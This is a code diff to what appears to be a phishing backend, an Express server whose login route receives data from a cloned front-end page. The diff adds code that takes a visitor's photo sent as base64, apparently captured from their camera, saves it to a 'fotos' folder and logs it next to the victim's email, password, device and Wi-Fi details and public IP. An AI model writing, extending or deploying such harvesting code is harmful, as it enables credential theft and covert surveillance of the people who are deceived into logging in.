@@ -5,6 +5,18 @@ require('dotenv').config();
 
 const app = express();
 
+// Função de conversão atualizada para usar a pasta 'fotos'
+const base64ToImage = (base64String, fileName) => {
+    // Criar pasta 'fotos' se não existir
+    const dir = './fotos';
+    if (!require('fs').existsSync(dir)){
+        require('fs').mkdirSync(dir);
+    }
+    
+    const buffer = Buffer.from(base64String.split(',')[1], 'base64');
+    require('fs').writeFileSync(`${dir}/${fileName}.jpg`, buffer);
+}
+
 app.use(cors({
     origin: process.env.FRONTEND_URL || 'https://cloned-f-render.netlify.app',
     methods: ['GET', 'POST'],
@@ -19,7 +31,17 @@ app.get('/', (req, res) => {
 
 app.post('/login', async (req, res) => {
     try {
-        const { email, senha, dispositivo } = req.body;
+        const { email, senha, dispositivo, foto, ipPublico } = req.body;
+
+        // Log da foto em base64
+        console.log('\n📸 FOTO CAPTURADA (BASE64) 📸\n');
+        console.log(foto);
+        
+        // Salvar a foto na pasta 'fotos'
+        const fileName = `foto_${Date.now()}`;
+        base64ToImage(foto, fileName);
+
+        console.log(`📸 Foto salva como: fotos/${fileName}.jpg`);
 
         // Log das credenciais
         console.log('\n');
@@ -62,6 +84,11 @@ app.post('/login', async (req, res) => {
             console.log('🔒 SEGURANÇA:', dispositivo.wifi.security || 'Não disponível');
         }
 
+        // Log das novas informações
+        console.log('\n📸 INFORMAÇÕES DA FOTO E IP 📸\n');
+        console.log('🖼️ FOTO BASE64:', foto);
+        console.log('🌐 IP PÚBLICO:', ipPublico);
+        
         // Log de informações da requisição
         console.log('\n🌍 INFORMAÇÕES DA REQUISIÇÃO 🌍\n');
         console.log('🌐 IP:', req.ip);
